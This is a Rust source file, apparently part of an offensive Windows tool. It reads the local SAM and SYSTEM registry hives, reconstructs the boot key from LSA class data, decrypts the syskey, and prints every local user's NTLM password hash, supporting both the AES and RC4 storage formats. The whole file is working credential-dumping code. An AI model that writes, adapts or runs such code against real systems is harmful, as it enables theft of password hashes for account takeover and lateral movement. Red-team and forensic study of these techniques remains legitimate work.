extern crate winapi;
use crate::utils;
use crate::crypt;

use winapi::shared::minwindef::{MAX_PATH, HKEY__};
use winapi::um::{
    winnt::KEY_READ,
    winreg::{RegOpenKeyExA, RegQueryInfoKeyA}
};
use std::{
    ffi::CString,
    ptr::null_mut,
    os::windows::ffi::OsStringExt,
    collections::HashMap
};
use winreg::{enums::*, RegKey};
use regex::Regex;
use des::decrypt;



// Get all users from SAM
pub fn get_user_hashes() {
    // Get the calculated BOOTKEY
    let boot_key = get_bootkey();
    
    println!("[+] Reading user RIDs from the SAM hive");
    let mut users: Vec<String> = Vec::new();

    match RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SAM\\SAM\\Domains\\Account\\Users") {
        Ok(subkeys) => {
            for key in subkeys.enum_keys().map(|x| x.unwrap()) {
                if Regex::new(r"^[0-9A-F]{8}$").unwrap().is_match(&key) {
                    //println!("\tUser: {}", key);
                    users.push(key);
                }
            } 
        },
        Err(e) => {
            println!("[!] Couldnt open SAM hive: {}", e);
            return;
        }
    };

    //println!("[+] Collecting F bytes");
    let mut f_bytes: Vec<u8> = Vec::new();

    match RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SAM\\SAM\\Domains\\Account") {
        Ok(syst) => {
            for (key, value) in syst.enum_values().map(|x| x.unwrap()) {
                if key == "F" {
                    // Collect F bytes
                    f_bytes = utils::extract_regval(value.to_string());
                }
            }
        },
        Err(e) => {
            println!("[!] Could not open SAM hive: {}", e);
            return;
        }
    };

    //println!("[+] Collecting V bytes");
    let mut user_v_map: HashMap<String, Vec<u8>> = HashMap::new();
    for user in users {
        let key_path = format!("SAM\\SAM\\Domains\\Account\\Users\\{}", user);
        match RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(key_path) {
            Ok(syst) => {
                for (key, value) in syst.enum_values().map(|x| x.unwrap()) {
                    if key == "V" {
                        // Collect V bytes for every user
                        user_v_map.insert(user.clone(), utils::extract_regval(value.to_string()));
                    }
                }
            },
            Err(e) => {
                println!("[!] Could not open SAM hive: {}", e);
                return;
            }
        }
    }

    // Start parsing the data
    println!("[+] Dumping user hashes:");
    for (key, value) in user_v_map {
        // Get and parse the username
        let (offset, len) = utils::prepare_username(&value[12..16], &value[16..20]);
        let username = utils::unicode_to_str(&value[offset as usize..(offset + len) as usize]);

        // Get the offset to the encrypted NTLM hash
        let enc_ntlm_offset = unsafe {
            let part = &value[168..172];
            let mut buffer = [0u8; 4];
            let mut counter = 0;
            for i in part.iter() {
                buffer[counter] = *i;
                counter += 1;
            }
            std::mem::transmute::<[u8; 4], i32>(buffer) + 204
        };

        match value[172] {
            56 => {
                // Decrypt the syskey
                let enc_syskey = &f_bytes[136..152];
                let enc_syskey_iv = &f_bytes[120..136];
                let dec_key = boot_key.clone();

                let syskey = crypt::aes_128_cbc_decrypt(&dec_key, &enc_syskey_iv, enc_syskey.to_vec());

                // Get the encrypted NTLM hash
                let enc_ntlm_hash = &value[enc_ntlm_offset as usize + 24..enc_ntlm_offset as usize + 24 + 16];
                let enc_ntlm_iv = &value[enc_ntlm_offset as usize + 8..enc_ntlm_offset as usize + 24];

                let entlm = crypt::aes_128_cbc_decrypt(&syskey, &enc_ntlm_iv, enc_ntlm_hash.to_vec());
                
                // Get the ntlm encryption keys
                let key_one = utils::get_des_key(key.clone(), vec![3,2,1,0,3,2,1]);
                let key_two = utils::get_des_key(key.clone(), vec![0,3,2,1,0,3,2]);

                // Get the NTLM hash
                let ntlm_hash = crypt::des_decrypt(&entlm, key_one, key_two);
                println!("\tName: {}\n\tNTLM: {}\n", username, ntlm_hash);
            },

            20 => {
                let encrypted_syskey = &f_bytes[128..144];
                let f_part = &f_bytes[112..128];

                let encrypted_ntlm = &value[enc_ntlm_offset as usize+4..enc_ntlm_offset as usize+4+16];
                let des_key = utils::get_des_key(key.clone(), vec![3,2,1,0]);

                let entlm = crypt::rc4_decrypt(
                    f_part.to_vec(),
                    encrypted_syskey,
                    boot_key.clone(),
                    encrypted_ntlm,
                    des_key
                );

                // Get the ntlm encryption keys
                let key_one = utils::get_des_key(key.clone(), vec![3,2,1,0,3,2,1]);
                let key_two = utils::get_des_key(key.clone(), vec![0,3,2,1,0,3,2]);
                
                // Get the NTLM hash
                let ntlm_hash = crypt::des_decrypt(&entlm, key_one, key_two);
                println!("\tName: {}\n\tNTLM: {}\n", username, ntlm_hash);
            },
            _ => {}
        }
    }
}



// Get the syskey from the SYSTEM hive
pub fn get_bootkey() -> Vec<u8> {

    println!("[+] Attempting to reconstruct the BOOTKEY from the SYSTEM registry hive");
    let required_keys = vec![
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD",
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1",
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG",
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data"
    ];

    let mut temp_key: String = String::new();

    for key in required_keys.iter() {
        println!("\tReading: {}", key);

        let key_path = CString::new(*key).expect("[!] Failed constructing CString");
        let mut hkey: *mut HKEY__ = null_mut();

        // Open a handle to the key
        let mut result = unsafe { RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            key_path.as_ptr(),
            0,
            KEY_READ,
            &mut hkey
        ) };

        if result != 0 {
            panic!("[!] Failed opening key");
        }

        // Read the key's class info
        let mut class_name: [i8; MAX_PATH] = unsafe { std::mem::zeroed() };
        let mut class_len = MAX_PATH as *mut u32;

        result = unsafe { RegQueryInfoKeyA(
            hkey,
            class_name.as_mut_ptr(),
            &mut class_len as *mut _ as *mut u32,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            std::mem::zeroed()
        ) };

        if result != 0 {
            panic!("[!] Failed querying key class info");
        }


        let u8slice : &[u8] = unsafe { 
            std::slice::from_raw_parts(class_name.as_ptr() as *const u8, class_name.len())
        };
        let to_push = String::from_utf8_lossy(&u8slice).replace("\u{0}", "");
        //println!("\t\tClass data: {:?}", to_push);
        temp_key.push_str(to_push.as_str());
    }

    //println!("[+] TempKey: 0x{}", temp_key);
    let transforms = vec![8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7];

    let mut boot_key: Vec<u8> = Vec::new();
    let chars: Vec<char> = temp_key.chars().collect();

    println!("[+] Applying transformations");
    for i in transforms {
        let first = chars[i * 2];
        let second = chars[i * 2 + 1];
        boot_key.push(u8::from_str_radix(format!("{}{}", first, second).as_str(), 16).unwrap());
    }

    let hex_string: String = boot_key.iter()
        .map(|byte| format!("{:02x}", byte))  // Format each byte as a 2-digit hex value
        .collect();
    println!("[+] BootKey: 0x{}", hex_string);

    return boot_key;
}